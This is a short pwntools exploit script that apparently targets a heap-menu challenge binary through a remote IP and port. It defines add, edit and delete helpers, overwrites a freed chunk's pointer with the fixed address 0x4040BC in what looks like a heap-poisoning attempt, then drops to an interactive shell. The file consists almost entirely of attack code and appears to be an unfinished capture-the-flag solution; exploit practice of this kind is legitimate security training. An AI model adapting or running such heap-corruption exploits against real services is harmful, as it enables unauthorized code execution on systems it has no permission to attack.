from pwn import *
# p = process("./pwn")
p = remote("123.56.85.29", "4205")
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'


def add(idx):
    p.recv(timeout=1)
    p.sendline("1")
    p.recv(timeout=1)
    p.send(str(idx))


def edit(idx, c):
    p.recv(timeout=1)
    p.sendline("2")
    p.recv(timeout=1)
    p.send(str(idx))

    p.send(c)


def delete(idx):
    p.recv(timeout=1)
    p.sendline("3")
    p.recv(timeout=1)
    p.send(str(idx))


add(0)
edit(0, p64(0x4040BC))
add(1)
add(2)

# gdb.attach(p)
p.interactive()